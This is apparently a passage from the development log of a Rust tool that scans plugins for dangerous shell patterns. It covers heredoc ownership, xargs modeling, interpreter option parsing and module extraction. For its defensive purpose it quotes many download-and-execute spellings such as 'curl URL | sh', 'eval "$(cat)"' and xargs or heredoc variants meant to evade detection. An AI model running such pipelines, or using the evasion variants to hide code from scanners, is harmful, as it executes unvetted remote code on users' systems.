   ended the analysis. Words now carry a `dynamic` flag (an unquoted or
   double-quoted `$`/backtick expansion or a captured substitution makes
   the word runtime-derived), and `ScriptCommand` mirrors it per
   argument, so a `-c` body is recognized as statically known text and
   reparsed through `ShellSummary`: the body's own pipeline fires the
   families, a body producing fetch output (`curl URL` inside) becomes
   a producer site for a downstream interpreter, and a body that
   executes inherited stdin as code (`sh -c sh`) pairs with the pipe.
   Runtime-derived bodies (`sh -c "$text"`) stay outside the static
   slice.
2. **Literal eval programs were not analyzed (P1).**
   `eval 'curl URL | sh'` executed the pipeline but recorded nothing.
   Static eval argument text (joined the way eval concatenates its
   arguments) now reparses as an executed shell body in the egress walk
   and in every consumption family; dynamic arguments remain outside
   the slice.
3. **Interpreter option parsing still changed semantics (P1).**
   `bash -O extglob` and `python3 -Ximporttime` missed High because
   option payload letters read as modes (`-Ximporttime` contains `m`),
   while `bash -n` and `python3 -h` emitted High without executing
   stdin. Both families are now walked letter by letter with arity
   parsed as we go: `-c` bodies are glued or separate, `-o`/`-O` and
   `-W`/`-X` consume a glued-or-separate value, `-n` is a parse-only
   read and `-h`/`-V`/`-D`/`--help`/`--version`/`--check` exit before
   stdin, and after `--` only the FIRST operand selects the script, so
   later words are positional parameters (`sh -- - arg` follows the
   POSIX operand rule the review specified).
4. **Transformer forwarding was mode-blind (P1).**
   `base64`, `base32`, `xxd`, and `gzip` forwarded the body in every
   mode, so `curl URL | base64 | sh` falsely emitted High, while `dd
   status=none` — a verbatim copier — was missed. Forwarding is now
   per command: base64/base32 only with `-d`/`-D`/`--decode`, xxd only
   with `-r`, gzip only decompressing, openssl only its decode forms,
   and `dd` only as a plain KEY=VALUE copier with no `if=`/`of=`/
   `conv=`/`skip=`/`count=`/block-size operands (which also gates
   whether it drains).
5. **Non-direct stdin code consumers evaded pairing (P1).**
   `source /dev/stdin` (and `.`), `eval "$(cat)"`, and
   `curl URL | xargs sh -c` execute remote-derived input but produced
   no High. `segment_reaches_interpreter` now recognizes explicit
   stdin-to-code consumers: source/dot reading `/dev/stdin` or
   `/dev/fd/0`, a substitution whose interior executes stdin as code
   (`echo "$(sh)"`) or — under an `eval` head — merely forwards it to
   the executed text (`eval "$(cat)"`), and `xargs` feeding an
   interpreter whose `-c` body is missing or references the positional
   parameters; a fixed body (`xargs sh -c 'echo safe'`) stays silent.
6. **Raw-line scanning missed multiline pipelines (P1).**
   `curl URL \` + `| sh` and the grammar continuation `curl URL |` +
   `sh` recorded egress but missed download-execute because each
   physical line tokenized alone. `shell_logical_units` now assembles
   shell logical commands across escaped newlines (removed, no byte
   inserted), trailing `|`/`|&`/`&&`/`||`, and open quotes, backticks,
   or `(`/`{` groups, applying `#` comments statefully along the way
   (a comment swallows its line's backslash continuation). Each unit
   keeps its starting line for findings; Python keeps its per-line
   scan.

Tests: six new regressions pin the confirmed cases
(`literal_c_bodies_are_analyzed`, `static_eval_arguments_execute`,
`interpreter_mode_reads_arity_exits_and_noexec`,
`transformer_forwarding_is_mode_sensitive`,
`stdin_code_consumers_pair_with_producers`,
`logical_units_join_multiline_pipelines`), and the shell strip-comment
unit assertions moved to `shell_logical_units`. Full verification
re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 182 analyzer (parser) / 172 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```
## v0.2.1 H3 — Review Response (twelfth round, reopened: quoted newlines, heredoc structure, option arity, and xargs taint)

Status: **complete**

Round 12 was reopened against the post-extraction HEAD: the focused suite
passed but seven P1 behavioral gaps and one P2 line-attribution defect
remained. All eight were reproduced as failing tests first
(`detect::round_twelve_tests`, 12 cases), then fixed. The round also
benefits from the Stage A layout: the source-layer fixes land in
`detect/shell/source.rs` and `detect/shell/lexer.rs`, not in the monolith.

1. **Multiline quoted bodies lost newline semantics (P1).**
   `eval 'echo safe\ncurl URL | sh'` assembled into one unit joined by a
   space, merging the body's two commands. Quoted and backtick
   continuations now push the literal newline (data inside the quotes),
   and the lexer treats a raw newline in reparsed text as a `;`-equivalent
   statement separator (words break on `\n`/`\r` like on spaces), so eval
   and `-c` bodies reparse as multi-statement scripts. Unquoted group
   continuations keep the existing `;` insertion.
2. **Heredocs were not structurally associated with their command (P1).**
   The old pass handled only the first `<<`, checked only the header's
   first command, and discarded everything after the delimiter. The new
   pass scans every stdin heredoc (`<<`/`<<-`; fd-prefixed forms stay
   data) with exact raw spans from the lexer's own operator classifier,
   captures every body in redirection order, attributes each redirect to
   the command containing it (`printf x | sh <<C | cat` executes the
   body), keeps only the last adjacent redirect's body per command, and
   preserves pipeline tails. Unterminated heredocs still pass through
   untouched, and a raw-scan/token disagreement leaves the line alone.
3. **`-c` resolved before valued cluster options (P1).**
   `bash -co errexit 'sh'` captured `errexit` as the body and missed High;
   `bash -co sh 'echo safe'` produced a false High. A later valued letter
   (`o`/`O`) in the same cluster now defers the `-c` capture; when the
   option walk reaches the first operand with `-c` pending, the operand IS
   the body (`--` and `-` operands included).
4. **Parse-only mode lost its input source (P1).**
   `InterpreterMode::ParseOnly` now carries whether a `-c` body exists:
   `bash -n -c 'echo safe'` parses the body and leaves the pipe for a
   later `sh` (High), while body-less parse-only (`bash -n`) still drains.
   `--dump-strings`/`--dump-po-strings` moved from exit-before-read to a
   noexec classification: they read and parse stdin without executing, so
   `curl | (bash --dump-strings; sh)` no longer emits a false High.
5. **xargs searched for `-c` past the script operand (P1).**
   `xargs sh local-script -c` fired because any `-c` spelling counted. The
   wrapped shell invocation is now parsed as options-then-operand: a
   static script operand pins the executed file (input words become
   positional parameters), a stdin operand (`-`) or no operand at all
   (input as the executed script file) counts as code, and `-c` only
   decides when it precedes the operand.
6. **xargs replacement-string taint was unimplemented (P1).**
   `-I`/`--replace` placeholders are now extracted and followed: the input
   reaches code when the placeholder is the wrapped program, the executed
   script operand, or inside a `-c` body at command position, in an `eval`
   argument, or as an interpreter's script operand. Data positions
   (`cp {} /tmp/x`, `echo {}`) stay silent.
7. **Decoder clusters ignored option arity (P1).**
   `base64 -w0d` read as decode mode and fired both families. GNU
   base64/base32 option parsing is now arity-aware: `-w` consumes the
   glued remainder (or the next argument) as the wrap width, so `-w0d` is
   a width, `-di` decodes, and `--decode` still matches.
8. **Heredoc removal corrupted line attribution (P2).**
   Removed body/terminator lines are now replaced with blank lines, and
   the rewritten header's own embedded newlines are counted against the
   original span, so findings anchor to their physical line
   (`cat <<CODE` + payload + `CODE` + a line-4 curl reports line 4).

Tests: twelve new cases in `detect::round_twelve_tests` pin the seven P1s
and the P2 at the artifact layer, plus the lowest responsible source-layer
case for quoted newlines. Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # both feature configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

Extraction note: `detect/shell/source.rs` still reads interpreter
classification from the parent `detect` module for heredoc ownership; that
upward reference becomes a sibling import when plan PR 3 extracts command
and interpreter modeling.
## v0.2.1 H3 — Review Response (round-12 reopen recovery: variant pinning, CLI FP/FN fixture, A2 completion)

Status: **complete**

Stage 0 was reopened a second time: the seven reopened P1s were fixed but
their NEIGHBORHOOD was not. A 25-case variant battery across all seven
families found two more genuine defects, both now fixed and pinned:

1. **Forwarded heredoc bodies were dropped (P1, false negative).**
   `cat <<C | sh` with `C = curl URL | sh` executed the body through the
   forwarding filter, but the heredoc pass treated every non-interpreter
   owner as data and dropped the body. Ownership is now a three-way
   classification: a shell interpreter in stdin-script mode rewrites the
   body as its own `-c`; a pure forwarding filter (`cat` with no file
   operand, `tee`) attaches the body as the DOWNSTREAM consumer's `-c`
   (`cat <<C | sh` becomes `cat | sh -c '…'`), crossing only pipeline
   syntax — never the list separators `;`/`&&`, which leave the body
   unconsumed (`cat <<A; sh <<B` keeps B's body on sh, A stays data).
2. **Decoder width values broke stdin modeling (P1, false negative).**
   `base64 -w 0 -d` fired decode-execute but missed download-execute:
   `drains_stdin` counted the `-w` width VALUE as a file operand, so the
   segment stopped forwarding and the fetch-to-interpreter chain broke.
   Operand counting is now arity-aware for base64/base32 (`-w`/`--wrap`
   consume the next argument); `-w0di` is still a width, `-w 0 -d` still
   decodes.

The remaining 23 battery variants passed at HEAD and are pinned as
permanent tests in `detect::round_twelve_tests` (18 cases total). A new
CLI-level fixture `fixtures/plugins/script-fp-fn/` holds BOTH directions of
the round in one plugin — the multiline quoted eval must fire (exactly one
download-execute High), while `base64 -w0d`, `xargs sh local-helper -c`,
and heredoc data must stay silent — asserted end-to-end through
`omasafe scan-plugin` (`h3_script_fixture_pins_false_positive_and_false_negative`).
The A1 golden corpus now includes the fixture; the regenerated baseline
shows the expected delta only (one finding, three honest network-access
capabilities, new fingerprint; all pre-existing fixture lines unchanged).

Structure (recovery steps 4–5, behavior-preserving):

- `detect/shell/source.rs` no longer imports interpreter or command
  modeling from the parent: heredoc ownership policy is injected at the
  facade as `classify_heredoc_owner`/`spells_shell_stdin_interpreter`
  closures, so the source layer depends only on the lexer and the module
  graph is acyclic.
- `balanced_bracket_span` moved to `detect/model.rs` (shared byte spans);
  the lexer and the Python detectors import it directly instead of
  reaching into the facade.
- Remaining A2 leaves extracted: `detect/qml/strings.rs`
  (`decode_js_escapes`) and `detect/script/python.rs` (the Python
  reverse-shell family).

Full verification re-run (both feature configurations):

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## v0.2.1 H3 — Review Response (round 13: heredoc body isolation, xargs batch/replace model)

Status: **complete**

Round-13 review found five adjacent regressions (three P1, two P2) in the
round-12 neighborhoods. All fixed and pinned in
`detect::round_thirteen_tests`:

1. **Kept heredoc bodies contaminated each other (P1, false negative).**
   Converting every attached body to a keep — so kept lines could hold
   their physical positions — concatenated independently executed shell
   programs into ONE synthetic source: with `cat <<A | sh -c sh; sh <<B`,
   an unmatched quote in A swallowed B, hiding a real `curl … | sh`.
   Kept bodies are no longer in-stream text: the heredoc pass returns each
   out-of-band body (indirect stdin-to-code consumer, xargs-processed
   input) as its own unit group, assembled in isolation and offset to the
   body's first physical line. Separately executed programs never share a
   parsing unit, and kept lines keep their line attribution. The
   attached-to-keep conversion is gone: attached bodies grow the header
   and the blank sections absorb the surplus uniformly.
2. **`-d`/`-0` combined with `-n` kept only the first item globally
   (P1, false negative).** GNU xargs executes the first item of EVERY
   batch. Delimiter mode now carries `-n` (`Whole` gained
   `per_invocation`; `-n` retunes word and delimiter modes), and the
   retained items are the first of each batch (`xargs -d, -n2 sh -c`
   executes the second batch's body).
3. **Bare `--replace` consumed the wrapped command (P1, false
   negative).** GNU `--replace[=STR]` takes its value only after `=` and
   defaults to `{}`. Fixed in all three places that modeled the arity:
   `xargs_placeholder` (bare → `{}`), `xargs_wrapped_command` (no separate
   value word), and the landing scan (no `advance = 2`).
4. **`-I`/`-L`/`-n` precedence was not last-option-wins (P2, false
   positive).** GNU xargs warns and honors the LAST of the three. The
   placeholder scan now drops a placeholder overridden by a later
   `-n`/`-L`/`--max-args`/`--max-lines` (a later `-I` restores it), and
   `-n` replaces line mode instead of being refused — `xargs -I{} -n2
   sh -c '{}'` is silent, `-n2 -I{}` still fires.
5. **Blank lines consumed `-L` capacity (P2, false positive).** GNU `-L`
   batches nonblank lines: a blank line neither fills a batch nor starts
   one unless a trailing-blank line logically continues onto it. The
   grouping now skips standalone blank lines, so the model's batch
   boundaries match runtime invocations.

The `-L` work also pinned a model detail the new tests encode: `-L`
word-splits each logical line and the batch's first WORD item becomes the
`-c` body, so an unquoted pipeline line executes only its first word
(`sh -c curl …`) — the pipeline must be quoted to run as one item.

Full verification re-run (both feature configurations):

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
```

## Plan A3 — Shell Syntax and Command Modeling Extraction

Status: **complete**

Behavior-preserving extraction (Stage A step 4 of
[`detect-rs-maintenance-plan.md`](detect-rs-maintenance-plan.md)) per the
established A2 conventions: item bodies moved verbatim, no renames, no
signature changes, visibility scoped to `pub(in crate::detect)`.

- `detect/shell/syntax.rs` (192 lines): statement splitting with the
  preceding control operator (`conditional_statements`), the
  conditional-list exit-status set (`Outcomes`), `!` pipeline negation,
  pipeline segmentation, and compound-group discovery (`GroupKind`,
  `matching_group_close`, `grouped_token_ranges`). Depends only on the
  lexer.
- `detect/shell/command.rs` (452 lines): `ScriptCommand` and
  command-position parsing — `segment_commands` with prefix skipping and
  wrapper unwrapping (`sudo`/`command`/`env`/`exec`/`time`/`pkexec`/`doas`,
  including `env -S`), argv collection, `command_basename`, redirect
  semantics (`redirect_moves_stdout_away`, `redirect_moves_stdin_away`,
  depth-zero redirect walks), `compound_position`, and
  `statement_outcomes` (placed here because the outcome model reads
  command heads, keeping the plan's dependency direction:
  command → syntax, never the reverse).
- `detect/shell/interpreter.rs` (310 lines): interpreter basenames and
  families, the per-argument execution-mode parse (`interpreter_mode`:
  `-c` bodies with deferred cluster capture, stdin scripts, parse-only,
  exits, long options), `separate_cluster_value`, and the statically
  known shell text a command executes (`interpreter_static_body`,
  `static_command_body`, eval argument joining).

The facade re-imports the moved names explicitly; the effect walks,
xargs input model, and detector families remain in `detect.rs` (A4
territory). `detect.rs` is now 10,914 lines (from 11,806), of which
~5,800 are test modules that A5 will move last. Item-signature identity
across the move was checked mechanically (names and arities unchanged;
only fmt wrapping differs).

Full verification gate (both feature configurations):

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # both configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

## Plan Step 8 — Typed Shell IR Foundation (2026-08-31)

Status: **in progress — foundation slice complete**

The first Stage B slice adds `detect/shell/ir.rs`, a bounded typed owner for
each shell logical unit. It records list guards, pipeline stages, explicit
subshell/brace/arithmetic nodes, command-position wrappers, command redirects,
and word provenance (`Static`, parameter/command/process/arithmetic
expansion, or `Mixed`). The shell frontend now builds this representation once
per assembled unit and supplies its IR-owned token stream to the existing
detector families, preserving their behavior while establishing the boundary
for later effect summaries.

The IR uses the existing `MAX_SHELL_ANALYSIS_DEPTH` ceiling before descending
into nested compound bodies. This keeps the new parser safe on the same
12,000-level adversarial nesting case that the detector budget covers; the
fallback is an opaque node rather than an unbounded recursive walk. Structural
tests cover guards, pipelines, compound preservation, redirects, and word
provenance.

Verification: both feature configurations pass workspace tests and clippy with
`-D warnings`; CLI asset generation, the determinism canary, formatting, and
`git diff --check` also pass. Centralized command effects and migration of
detectors to consume typed nodes remain the next Stage B slices.

## Plan Step 9 — Centralized Command Effects (2026-08-31)

Status: **complete — command-site summary slice**

The next Stage B slice adds a typed `CommandEffects` summary in
`detect/shell/effects.rs`. Interpreter modes, static shell bodies, `eval`,
`source`, `xargs`, stdin transformers, redirects, and direct `curl`/`wget`
egress now classify stdin, stdout, execution, and egress at one command-site
boundary. The existing compound and pipeline walks compose those summaries,
while preserving the special contract that Python stdin is consumed as Python
input but is not an H3 shell-code sink.

The old parallel stdin behavior and command-code-consumer decisions were
removed. Focused table-driven tests cover stdin scripts, static bodies,
parse-only mode, redirects, xargs executable text, transformers, and direct
fetches. Full detector migration to the IR-owned command nodes and bounded
summary caching remain subsequent Stage B work.

## Stage B — Parse Once, Summarize Once (2026-08-31)

Status: **in progress — bounded effect-summary cache complete**

`ShellBudget` now owns a per-analysis cache for static shell bodies. Repeated
`-c`/`eval` effect walks, fetch-egress walks, and live-fetch-output walks reuse
the same exact body text instead of re-tokenizing and recursively re-walking
identical text. The three result slots are independent so a negative egress
answer cannot stand in for a stdin summary. The cache is capped at 64 entries
and 64 KiB of body text, skips oversized bodies, and never reuses a cached
result after the shared budget is exhausted; incomplete summaries are not
retained.

A focused test pins reuse (no second node charge) for positive and negative
results and fail-closed budget behavior across the effect, egress, and
consumption callers. The later finding-tag cache and typed consumer migrations
are recorded in the subsequent Stage B entries.

## Stage B — Direct IR Egress Consumption (2026-08-31)

Status: **in progress — direct command egress slice complete**

`Statement` now retains typed reachability derived from the existing outcome
model. Shell egress consumes `ShellProgram` command nodes for direct `curl` and
`wget` detection, including wrapper-unwrapped commands and nested
subshell/brace bodies. The existing token walk remains the bounded fallback for
command and process substitutions and static `-c`/`eval` bodies.

## Stage B — Direct IR Consumer Effects (2026-08-31)

Status: **in progress — typed stdin-consumer slice complete**

The centralized command-effect summary now accepts typed IR commands, deriving
redirect behavior from node-owned redirects and dynamic-body behavior from word
provenance. Typed stdin reachability walks reachable compound statements and
pipeline forwarding, so direct fetch-to-interpreter pairing handles wrappers,
short-circuited branches, stdin/stdout redirects, and nested consumer groups
without reconstructing those decisions from raw tokens. Compound producers,
substitutions, and static re-parsed bodies still use the bounded token fallback.

Layer tests cover interpreter modes, dynamic `eval`, forwarding and draining
groups, guarded branches, and redirect ownership in both feature
configurations.

## Stage B — Direct IR Decoder Pairing (2026-08-31)

Status: **in progress — typed decoder/producer slice complete**

Decode-execute pairing now reuses typed command nodes for direct decoder
classification (`base64`, `base32`, `xxd`, and `openssl`) and shared stdout
effects. Direct fetch and decoder producers share the same typed pipeline walk,
which consumes IR reachability for parse-only consumers, guarded branches,
wrappers, forwarding compounds, and output redirects. Compound producers,
substitutions, and static re-parsed bodies remain on the bounded token fallback
until their child programs are stored in the IR.

## Stage B — Static Body Finding Summaries (2026-08-31)

Status: **in progress — completed finding-tag cache slice**

Repeated static `-c`/`eval` bodies now cache the complete shell consumption
finding tag set after a bounded walk. Cached tags are recreated with the current
line and download-rule context, so the cache is independent of source
locations, caller anchoring, and the existing stdin/egress/live-output slots.
Partial walks are never retained, and an exhausted budget cannot reuse a prior
finding result. Focused tests cover positive download/decode results, negative
bodies, re-anchoring, and fail-closed exhaustion.

## Review Round Three — Heredoc Body Boundaries and Invalid xargs Counts (2026-08-31)

Status: **complete**

The final Stage A review round found and fixed the remaining boundary defect
from round two, plus the invalid-count behavior in both xargs code paths. The
new `detect::tests::round_sixteen_tests` suite has 7 cases and covers the
six reproductions plus the corrected valid-count check.

1. **Trailing operators and multiline groups now use Bash's heredoc boundary
   (P1).** A heredoc body begins after the first newline that is not escaped
   or inside quotes/backticks. A trailing `|`, `&&`, or open compound group
   does not postpone the body. The resumed probe now classifies the complete
   post-terminator pipeline/group continuation, while grouped ownership walks
   the redirect's own nesting depth even when physical newlines were emitted
   as separators. Removed body/terminator placeholders preserve line numbers
   without becoming synthetic whitespace in the resumed command.
2. **Invalid xargs counts stay silent (P2).** `xargs_option_area_is_valid`
   validates `-n`/`-L`/`-s` as positive numeric counts, rejects unparsable
   `-P`/`--max-procs` while accepting `-P 0`, honors option arity for
   dash-leading `-I` values, and gates both direct stdin consumers and
   forwarded-heredoc landing. GNU's optional-argument behavior for bare
   `--max-lines`/`--eof` remains consistent across the wrapped-command,
   placeholder, and landing walks.
3. **The valid-count regression expectation was corrected.** A static
   `sh -c '{}'` body does not execute xargs input without a replacement or
   positional-parameter code path, so the test now uses bodyless `sh -c`.

Full verification gate in both feature configurations:

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # exit 0
cargo clippy --workspace --all-targets --no-default-features -- -D warnings # exit 0
cargo test --workspace                                   # 229 analyzer, 75 CLI
cargo test --workspace --no-default-features              # 219 analyzer, 75 CLI
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

## Stage B — Typed Child Programs and IR Walk Closure (2026-08-31)

Status: **complete**

The typed shell IR now owns bounded child programs for static shell bodies
(`-c`/`eval`) and command/process substitutions. Child programs retain the
same logical-unit boundaries, guards, pipeline nodes, redirects, word
provenance, and nested ownership as their parents, so effects, egress, and
download/decode pairing can summarize the parsed representation without
re-tokenizing the same body. Finding-tag summaries continue to use the
per-analysis bounded cache and re-anchor at the caller's line.

Typed live-fetch output and decoder walks now compose through static child
programs, while typed command effects consume IR-owned redirects and child
stdin summaries. Unsupported shell control structures are represented as
explicit non-command control-flow nodes (`if`, `while`, `until`, `for`, and
`case`, plus their reserved delimiters) rather than flattened argv. The
existing token path remains a bounded compatibility fallback for arithmetic
substitution details, unsupported syntax, and children withheld at the
depth ceiling; it is never treated as a complete typed summary after budget
exhaustion.

Layer coverage now includes child-body ownership, static-body fetch/decoder
composition, guarded and redirected pipelines, control-flow preservation,
malformed/UTF-8 input safety, and cache re-anchoring. The Stage B code slices
are committed as `fa886e2` and `7464bba`; the full two-configuration
verification gate below is the closure gate for this stage.

## Plan A4 — Detector Family Extraction

Status: **complete**

Behavior-preserving extraction (Stage A step 5 of
[`detect-rs-maintenance-plan.md`](detect-rs-maintenance-plan.md)), A2/A3
conventions unchanged: bodies moved verbatim, no renames, visibility scoped
to `pub(in crate::detect)`, facade re-imports explicitly.

- `detect/shell/effects.rs` (716 lines): the stdin/stdout/code-execution
  effect model — `StdinBehavior`, `segment_stdin_behavior`, the
  producer/consumer reachability walks (`segment_has_live_producer`,
  `pipeline_has_live_producer`, `stdout_reaches`,
  `segment_stdout_preserved`, the compound-group stdin walks),
  `ShellSummary`/`static_body_summary`, and the fetch/decode command
  classifications (`command_fetches`, `command_decodes`,
  `command_is_decode_mode`) shared by the families.
- `detect/shell/xargs.rs` (808 lines): the GNU xargs input model (option
  area, replacement placeholder, batch/delimiter modes, item splitting,
  landing classification). Split from effects because the combined file
  crossed the plan's ~1,500-line module ceiling; the model has exactly two
  external callers (`stdin_code_consumer`, the facade's forwarded-heredoc
  fate) and charges no analysis budget.
- `detect/shell/egress.rs` (227 lines): fetch attribution — the
  executed-path walk over statements, segments, compound groups, and
  active substitutions (`tokens_fetch_egress`), the segment/group command
  search, and `script_body_fetches` (the `-c`-body egress entry the QML
  argv path shares).
- `detect/shell/consumption.rs` (418 lines): download/decode execution
  pairing — `shell_consumption_findings` and its arithmetic/group/
  substitution recursions, `consumed_substitutions`, the
  fetch/decoder-to-interpreter pipeline pairing, and per-line finding
  deduplication.
- `detect/shell/indicators.rs` (99 lines): `reverse_shell_spelling` and
  the shared-temporary-path predicates (`segment_has_shared_temp_path`,
  `writable_shared_temp_mode`, `chmod_relaxes_shared_temp`) — pure
  predicates, never emitting findings themselves.

Facade coupling made explicit: `ResultParts` (+ its `rule_id`/
`semantic_value` fields), `parts`, `lower_contains`, and the four shell
rule constants are now `pub(in crate::detect)` so the families construct
findings without duplicating facade helpers. The heredoc-ownership
closures, `sink_head`, `analyze_script_source`, and
`disclose_budget_limitation` remain facade glue. `detect.rs` is now
8,741 lines (from 11,806 at A2 completion), of which ~5,800 are test
modules A5 will move last. Item-signature identity across the move was
checked mechanically.

Full verification gate (both feature configurations):

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # both configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

## Plan A5 — Test Modules Moved Out of `detect.rs`

Status: **complete**

The test modules (Stage A step "move tests last") left `detect.rs` for a
behavior-split tree under `detect/tests/`, compiled only in test builds via
`#[cfg(test)] mod tests;` on the facade. Module bodies moved verbatim with
two mechanical adjustments:

- every module's `use super::*;` (the facade namespace) became
  `use crate::detect::*;` — private facade items remain reachable because
  the test tree is a descendant of `detect`, so no production visibility
  was widened for tests;
- the facade `include_str!` for the A1 golden corpus was re-anchored to
  the moved file (`../golden/fixture-corpus.txt`); the fixture corpus file
  itself did not move.

One rename for clarity: the original catch-all `mod tests` (the S3
rule-contract suite) is now `mod rule_contracts`, and its five
`super::tests::analyze_with` callers (integration and golden tests) were
updated. The shared `s4_family_tests` runner module kept its name, so the
sibling `use super::s4_family_tests::{rule_ids, run};` imports are
untouched. The h3_script_tests module's direct facade references
(`classify_heredoc_owner`, `forwarded_body_fate`,
`shell::source::shell_logical_units`) became `crate::detect::` paths.

Ordering note: the maintenance plan's pull-request sequence puts the
QML/JS and Python frontend extraction (step 6) before this test move
(step 7). The test move was performed first; it does not block the
frontend extraction, which keeps working through the facade re-imports.

Layout:

```text
detect/tests/
  mod.rs                  # declarations only
  s4_family_tests.rs      # shared corpus runner helpers
  rule_contracts.rs       # S3 rule contracts (AST + lexical parity)
  integration_tests.rs    # analyze_inventory / report shape
  s4_boundary_tests.rs    # S4 priority surfaces
  h2_reference_tests.rs   # reference sinks and typed rejections
  h3_script_tests.rs      # H3 shell families end-to-end
  golden_tests.rs         # A1 characterization golden
  round_twelve_tests.rs   # round-12 reopen battery
  round_thirteen_tests.rs # round-13 regressions
```

`detect.rs` is now 2,919 lines (from 11,806 at Stage A start) — pure
production code. The `#[test]` inventory is unchanged (164 in the detect
tree; per-suite counts identical in both feature configurations:
201 parser-backed / 191 lexical, with the same 13 workspace suites).

Full verification gate (both feature configurations):

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # both configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

## Stage A Review Round — Four Behavioral Fixes in the Heredoc and xargs Models

Status: **complete**

Review of the integrated Stage A range (39b8703..7a5db6d) found four
behavioral defects, all reproduced first, fixed, and pinned at the lowest
responsible layer plus the end-to-end artifact layer
(`detect::tests::round_fourteen_tests`, 14 cases) and through a new CLI
fixture `fixtures/plugins/heredoc-ownership/` holding both directions of
the ownership round in one plugin.

1. **xargs replacement mode died under `-n1` (P1, false negative).**
   `xargs_placeholder` cleared replacement for every later `-n`, but GNU
   xargs preserves `-I` specifically under `-n1`/`--max-args=1` (one whole
   item per invocation is what `-I` already means) while `-L` clears at
   every count — probed against the local GNU xargs and mirrored exactly
   in both `xargs_placeholder` and the landing model
   (`set_word_batch` keeps whole-line replacement mode for `-n1`).
   `curl URL | xargs -I{} -n1 sh -c '{}'` now fires download-execute.
2. **Heredoc ownership was lost across continued command lines (P1, false
   negative).** The heredoc pass tokenized each physical line, so with
   `sh \` + `<<C` the classifier saw no owner and dropped executable code
   as data. The unit-assembly state machine is now factored into a
   reusable `UnitAssembler`; the heredoc pass drives a second instance
   over the emitted text and classifies each header against its COMPLETE
   continued command (escaped newline, open quote, or trailing operator
   continuations), with this line's operators mapped to the joined
   stream's final heredoc tokens.
3. **Heredocs inside compound groups fell through as top-level code (P2,
   false positive).** The raw heredoc scan skipped balanced parentheses
   entirely, so `(cat <<C)` never captured its body and the payload
   analyzed as a standalone unit. The scan now skips only
   command-substitution interiors (`$(`) and quoted/backtick regions; a
   raw-scan/token agreement check (count equality) guards the rewrite,
   leaving the line alone on any disagreement. `(cat <<C)` is data,
   `(sh <<C)` executes through the real ownership path.
4. **Same-command heredoc override used token adjacency (P2, false
   positive).** `sh <<A -x <<B` marked BOTH bodies executable because the
   redirects were not adjacent. Override is now decided by command
   ownership — a pipeline-segment ordinal per heredoc operator, where
   every list separator at any group depth starts a new command — so only
   a later heredoc of the same command overrides (`sh <<A; sh <<B` keeps
   both, `sh <<A -x <<B` keeps B).

Full verification gate (both feature configurations):

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # both configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

## Plan Step 6 — QML/JS and Python Frontend Extraction (Stage A closed)

Status: **complete**

The remaining production code left `detect.rs` for the plan's target
layout, completing Stage A's acceptance criterion (a facade well below
1,500 lines). Item bodies moved verbatim; visibility stays scoped to
`pub(in crate::detect)`.

- `detect/model.rs` (317 lines): `FileOutcome`, `ResultParts`, `SinkKind`,
  the rule-id constants, `parts`/`occurrence`, `capability_covering_rule`,
  and the shared text helpers (`truncate_bytes`, `lower_contains`,
  `strip_line_comment`/`CommentStyle`, `unquoted_text`, `find_word`,
  `disclose_budget_limitation`) beside the existing byte-span helper.
- `detect/references.rs` (280 lines): the reference machinery —
  `resolve_reference`, `SinkPosition`, `ReferenceCandidate`, scheme
  classification, typed rejection reasons, sink findings, and directory
  imports.
- `detect/qml/lexical.rs` (752 lines): the lexical QML/JS scanner,
  `find_shell_interpreter`, execution-span evaluation, argv egress
  attribution, and the lexical sink-literal walks.
- `detect/qml/ast.rs` (835 lines, feature-gated): the tree-sitter walk
  with its import-surface and reference-sink handling.
- `detect/qml/mod.rs` (38 lines): the QML/JS entry points over both
  feature configurations.
- `detect/script/mod.rs` (392 lines): shell/Python dispatch and result
  anchoring, with the heredoc-ownership and forwarded-body classifiers
  the shell source layer receives.
- `detect.rs` (452 lines): public API, inventory orchestration, manifest
  context — a facade. The model surface is re-exported through the facade
  namespace (`pub(in crate::detect) use model::*;`) because the shell
  detector modules and the test tree consume those names via
  `crate::detect::` paths; a small `#[cfg(test)]` re-export block serves
  names only the test tree reads.

Mechanical verification: item-signature diff across the whole tree shows
zero removed or renamed items (the only additions are the moved items'
new module homes). Full verification gate in both feature
configurations:

```text
cargo fmt --all -- --check                               # exit 0
cargo clippy --workspace --all-targets -- -D warnings    # both configs
cargo test --workspace                                   # both configs
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
git diff --check                                         # clean
```

Stage A is complete: `detect.rs` is a 452-line facade over ten focused
modules; every module is under the 1,500-line bound. Stage B (the typed
shell IR and centralized command effects) is next.

